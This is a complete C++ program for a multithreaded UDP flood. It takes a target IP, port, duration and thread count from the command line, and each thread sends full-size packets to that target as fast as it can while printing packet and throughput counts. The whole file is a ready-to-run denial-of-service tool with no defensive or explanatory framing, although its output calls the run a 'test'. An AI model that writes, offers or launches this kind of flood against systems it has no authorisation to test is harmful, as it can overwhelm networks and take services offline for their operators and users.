#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class UDPFlood {
public:
    UDPFlood(const std::string& ip, int port, int duration, int threads)
        : target_ip(ip), target_port(port),
          duration_seconds(duration), thread_count(threads) {}

    void run() {
        std::cout << "Starting UDP flood to " << target_ip << ":" << target_port
                  << " for " << duration_seconds << " seconds using "
                  << thread_count << " threads\n";

        std::vector<std::thread> workers;
        for (int i = 0; i < thread_count; ++i) {
            workers.emplace_back([this]() { worker_thread(); });
        }

        auto start = std::chrono::steady_clock::now();
        while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - start).count() < duration_seconds) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            print_stats();
        }

        running = false;
        for (auto& t : workers) {
            t.join();
        }

        print_final_stats();
    }

private:
    std::string target_ip;
    int target_port;
    int duration_seconds;
    int thread_count;
    std::atomic<bool> running{true};
    std::atomic<uint64_t> packets_sent{0};
    std::atomic<uint64_t> bytes_sent{0};

    void worker_thread() {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            perror("socket creation failed");
            return;
        }

        // Set larger buffer size
        int buf_size = 1024 * 1024; // 1MB
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &addr.sin_addr);

        // Use optimal 1472 byte payload (Ethernet MTU)
        char buffer[1472];
        memset(buffer, 'X', sizeof(buffer));

        while (running) {
            ssize_t sent = sendto(sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr*)&addr, sizeof(addr));
            if (sent > 0) {
                packets_sent++;
                bytes_sent += sent;
            }
        }
        close(sock);
    }

    void print_stats() {
        std::cout << "\rPackets: " << packets_sent
                  << " | MB: " << bytes_sent / (1024 * 1024)
                  << " | Threads: " << thread_count << std::flush;
    }

    void print_final_stats() {
        double mbps = (bytes_sent * 8.0) / (duration_seconds * 1024 * 1024);
        std::cout << "\n\nTest complete:\n"
                  << "Total packets: " << packets_sent << "\n"
                  << "Throughput: " << mbps << " Mbps\n"
                  << "Average rate: " << packets_sent/duration_seconds << " pps\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <duration> <threads>\n"
                  << "Example: " << argv[0] << " 192.168.1.100 9999 60 8\n";
        return 1;
    }

    try {
        UDPFlood flood(argv[1], std::stoi(argv[2]), 
                     std::stoi(argv[3]), std::stoi(argv[4]));
        flood.run();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}
